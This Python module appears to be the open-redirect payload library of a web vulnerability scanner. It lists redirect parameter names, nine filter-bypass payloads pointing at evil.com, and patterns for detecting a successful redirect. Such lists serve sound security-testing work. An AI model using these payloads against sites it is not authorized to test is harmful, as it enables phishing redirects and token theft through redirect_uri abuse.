"""Open Redirect Payload 库"""

REDIRECT_PARAMS = [
    "redirect", "url", "next", "return", "goto", "returnUrl", "returnTo",
    "redirectUrl", "redirect_to", "redirect_uri", "forward", "target",
    "r", "u", "link", "continue", "destination", "origin", "redir",
]

REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "\\\\evil.com",
    "https:evil.com",
    "https://evil.com%40example.com",
    "https://example.com@evil.com",
    "/%09/evil.com",
    "////evil.com",
    "https://evil.com/%2F..",
]

DETECTION_PATTERNS = [
    "evil.com",
    "Location: https://evil.com",
]


def get_redirect_params() -> list[str]:
    return REDIRECT_PARAMS


def get_redirect_payloads() -> list[str]:
    return REDIRECT_PAYLOADS
